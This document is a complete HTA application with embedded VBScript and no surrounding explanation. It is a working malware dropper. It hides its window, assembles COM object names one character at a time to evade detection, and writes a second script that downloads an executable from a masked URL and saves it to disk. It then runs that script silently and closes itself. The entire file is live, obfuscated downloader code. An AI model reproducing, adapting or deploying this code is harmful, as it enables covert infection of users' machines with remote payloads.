<HTML>
<HEAD>
<TITLE>a</TITLE>
<HTA:APPLICATION ID="b" APPLICATIONNAME="c" BORDER="none" BORDERSTYLE="normal" CAPTION="no" ICON="" CONTEXTMENU="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SHOWINTASKBAR="no" SINGLEINSTANCE="no" SYSMENU="no" VERSION="1.0" WINDOWSTATE="minimize"/>
<SCRIPT LANGUAGE="VBScript">
d = "e.vbs"
Set f = CreateObject("S"+"c"+"r"+"i"+"p"+"t"+"i"+"n"+"g"+"."+"F"+"i"+"l"+"e"+"S"+"y"+"s"+"t"+"e"+"m"+"O"+"b"+"j"+"e"+"c"+"t")
Set g = f.CreateTextFile(d, True)
g.write "Dim i" & vbcrlf
g.write "Dim j" & vbcrlf
g.write "Set j = CreateObject(""M""+""i""+""c""+""r""+""o""+""s""+""o""+""f""+""t""+"".""+""X""+""M""+""L""+""H""+""T""+""T""+""P"")" & vbcrlf
g.write "j.Open ""GET"", ""http://xxx.xxxxxxxx.xxx/xxx/xxx/test.exe"", False " & vbcrlf
g.write "j.Send" & vbcrlf
g.write "i = j.ResponseBody" & vbcrlf
g.write "Const k = 1" & vbcrlf
g.write "Const l = 2" & vbcrlf
g.write "Dim m" & vbcrlf
g.write "Set m = CreateObject(""A""+""D""+""O""+""D""+""B""+"".""+""S""+""t""+""r""+""e""+""a""+""m"")" & vbcrlf
g.write "m.Type = k" & vbcrlf
g.write "m.Open" & vbcrlf
g.write "m.Write i" & vbcrlf
g.write "m.SaveToFile ""test.exe"", l" & vbcrlf

g.Close
Dim h
Set h = CreateObject("W"+"S"+"c"+"r"+"i"+"p"+"t"+"."+"S"+"h"+"e"+"l"+"l"+"")
h.Run "e.vbs", 0, false
</SCRIPT>
<script>window.close()</script>
</HEAD>
</html>